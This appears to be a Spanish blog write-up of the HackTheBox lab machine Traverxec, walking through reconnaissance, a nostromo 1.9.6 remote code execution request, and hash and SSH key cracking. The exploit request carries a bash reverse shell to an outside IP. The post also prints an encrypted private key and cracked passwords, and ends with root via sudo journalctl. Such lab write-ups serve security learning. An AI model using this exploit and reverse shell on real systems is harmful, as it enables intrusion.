---
layout: post
title:  "Maquina Traverxec de HackTheBox (Si necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HacktTheBox llamada TRAVERXEC
tags: HackTheBox, Nostromo RCE, Burpsuite, Cracking Id-Rsa, SSH, Journalctl, Web Hacking, Writeup, 
---

# Traverexec ~ TryHackMe

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.165     "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Usamo la herramienta `Whatweb`
```bash
└─# whatweb http://10.10.10.165                                                                                                                                                                                1 ⚙
http://10.10.10.165 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nostromo 1.9.6], IP[10.10.10.165], JQuery, Script, Title[TRAVERXEC]
```
Procedemos a hecharle un vistazo visual a la web
```bash
# Datos Relevantes encontrados:
Version y servicio : nostromo 1.9.6 
Nombre de usuario a nivel web: David White
```
Hacemos una busqueda en Searchsploit de Nostromo 1.9
```bash
# searchsploit nostromo 1.9   
-------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------
nostromo 1.9.6 - Remote Code Execution                                                                              | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                | linux/remote/35466.sh
-----------------------------------------------------------------------------------------------------------------------------------------------------
```
Investigamos para ver lo que nos hace el exploit que no funciona en python3, para seguir la misma metodologia manualmente.
  
Tramitamos una peticion por post de el formulario de contacto: Y la pillamos con Burpsuite.

Vemos que lo que nos hacia el rce_nostrum 1.9.6 basicamente era una peticion por POST modificando la cabecera:
```bash
"---------------------  Peticion tramitada desde el Repiter de Burpsuite -----------------------"
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
Host: 10.10.10.165
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 65
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.10.165
Connection: close

echo
echo
bash -c 'bash -i &> /dev/tcp/10.10.16.132/443 0>&1'
---------------------------------	--------------------------
```
Nos ponemos a la escucha con una session de `NC -VLNP 443`	y recibimos la `R-shell`
Hacemos un tratamiento de la tty como siempre

# Escalada de privilegios, de www-data a el usuario David
```bash
www-data@traverxec:/var/nostromo/conf$ ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo/conf$ 
```
Encontramos el hash de david hay que intentar crackearlo
```bash
# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (?)
1g 0:00:00:20 DONE (2021-07-09 22:53) 0.04770g/s 504696p/s 504696c/s 504696C/s NuiKo910..Noury
Use the "--show" option to display all of the cracked passwords reliably
Session completed

"david: Nowonly4me"
```

Encontramos en el directorio de david /home/david/protected-file-area

lo probamos desde la web apuntando a : http://10.10.10.165/~david/protected-file-area/ 

encontramos que se nos piden credenciales para entrar a la zona privada, usamos las encontradas y obtentemos un backup del direcctorio /home/david/ que contiene
la carpeta .ssh/ con una id_rsa encriptada
```bash
# cat id_rsa                                                                                  
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```
Buscamos por las utilidades para crackear un clave ID_RSA encryptada para ssh
```
# locate 2john | grep "ssh"       
/usr/share/john/ssh2john.py
                                                                                                        
# python3 /usr/share/john/ssh2john.py        
Usage: /usr/share/john/ssh2john.py <RSA/DSA/EC/OpenSSH private key file(s)>

# python /usr/share/john/ssh2john.py id_rsa 
id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
[Errno 2] No such file or directory: 'hashRSA'
                                                                   
                                                                                                       
# nano hash ---> pegamos el hash obtenido para pasarselo a John
```
Crackeamos el Hash obtenido con la herramienta John
```
# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
"hunter"           (id_rsa)
Warning: Only 6 candidates left, minimum 8 needed for performance.
1g 0:00:00:01 DONE (2021-07-10 00:08) 0.5291g/s 7588Kp/s 7588Kc/s 7588KC/s *7¡Vamos!..hackthebox
Session completed
```
Nos Conectamos por ssh con la contraseña 
```bash
# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ 
```
Conseguimos escalar privilegios hasta el usuario David

Para conseguir el user root tenemos que mirar en el directorio de David que hay un script que ejecuta el comando journalctl como sudo

probamos a ejecutarlo pero intentamos quedarnos en el contexto de vi poniendo la terminal muiy muy pequeñita y justo en ese momento le metemos el comando 
```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2021-07-09 15:38:50 EDT, end at Fri 2021-07-09 18:36:17 EDT. --
Jul 09 16:54:54 traverxec su[878]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=david
Jul 09 16:54:55 traverxec su[878]: FAILED SU (to david) www-data on pts/0
Jul 09 16:56:15 traverxec su[881]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=www-data rhost=  user=david
Jul 09 16:56:17 traverxec su[881]: FAILED SU (to david) www-data on pts/0
Jul 09 18:28:12 traverxec nhttpd[779]: /../../../../bin/sh sent a bad cgi header
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2021-07-09 15:38:50 EDT, end at Fri 2021-07-09 18:36:47 EDT. --
!/bin/sh
# whoami
root                                                                                                    
#           
9aa36a6d76f785dfd320axxxxxxxxxxxd906
```
Maquina Rooteada =)
